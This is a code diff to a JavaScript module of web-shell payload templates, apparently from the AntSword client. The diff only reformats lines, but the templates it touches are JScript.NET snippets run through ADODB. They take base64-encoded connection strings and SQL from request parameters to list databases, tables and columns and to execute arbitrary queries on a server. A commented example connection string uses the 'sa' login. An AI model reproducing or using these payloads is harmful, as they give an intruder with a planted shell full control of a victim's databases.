@@ -5,8 +5,7 @@
 module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   // 显示所有数据库
   show_databases: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
       var Rs=new ActiveXObject("ADODB.Recordset");
       Rs.Open("SELECT [name] FROM master.dbo.sysdatabases ORDER BY 1",Conn,1,1);
@@ -20,8 +19,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   },
   // 显示数据库所有表
   show_tables: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
       var Rs=new ActiveXObject("ADODB.Recordset");
       Rs.Open("USE ["+Request.Item["${arg2}"]+"];
@@ -37,8 +35,7 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
   },
   // 显示表字段
   show_columns: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       Conn.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"])));
       var Rs=new ActiveXObject("ADODB.Recordset");
       Rs.Open(System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"])),Conn,1,1);
@@ -51,13 +48,13 @@ module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
       Conn.Close();`.replace(/\n\s+/g, ''),
     // Driver={Sql Server};Server=(local);Database=master;Uid=sa;Pwd=
     [arg1]: '#{base64::conn}',
-    // USE [database1];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id(\'table1\') and A.xtype=B.xtype ORDER BY A.colid
+    // USE [database1];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where
+    // A.id=object_id(\'table1\') and A.xtype=B.xtype ORDER BY A.colid
     [arg2]: '#{base64::table}', // 这里其实传入的是获取表头的 sql 语句
   },
   // 执行SQL语句
   query: {
-    _:
-      `var Conn=new ActiveXObject("Adodb.connection");
+    _: `var Conn=new ActiveXObject("Adodb.connection");
       var strSQL:String=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg2}"]));
       Conn.ConnectionString=System.Text.Encoding.GetEncoding("!{ANT::ENDOCE}").GetString(System.Convert.FromBase64String(Request.Item["${arg1}"]));
       Conn.ConnectionTimeout=10;
